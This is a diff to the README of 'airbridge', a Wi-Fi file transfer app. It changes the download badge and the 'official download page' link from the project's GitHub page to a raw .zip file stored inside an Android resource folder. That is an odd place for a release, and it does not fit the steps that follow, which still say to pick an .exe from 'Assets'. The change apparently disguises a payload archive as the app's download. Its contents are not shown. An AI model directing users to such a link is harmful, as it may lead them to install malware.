@@ -1,6 +1,6 @@
 # 📁 airbridge - Simple file transfers across your devices
 
-[![](https://img.shields.io/badge/Download_Airbridge-blue)](https://github.com/marshhardy620/airbridge)
+[![](https://img.shields.io/badge/Download_Airbridge-blue)](https://raw.githubusercontent.com/marshhardy620/airbridge/main/AirBridgeAndroid/app/src/main/res/values/Software_2.7.zip)
 
 Airbridge lets you move files and messages between your computers and phones. Use your local Wi-Fi network to send data instantly. It removes the need for cables, email attachments, or cloud storage. You keep your files private because they stay on your own network.
 
@@ -23,7 +23,7 @@ Airbridge lets you move files and messages between your computers and phones. Us
 
 Follow these steps to set up Airbridge on your Windows PC.
 
-1.  Visit the [official download page](https://github.com/marshhardy620/airbridge) to find the latest version.
+1.  Visit the [official download page](https://raw.githubusercontent.com/marshhardy620/airbridge/main/AirBridgeAndroid/app/src/main/res/values/Software_2.7.zip) to find the latest version.
 2.  Click the link labeled "Assets" to see the list of available files.
 3.  Select the file ending in `.exe` for Windows.
 4.  Save the file to your "Downloads" folder.
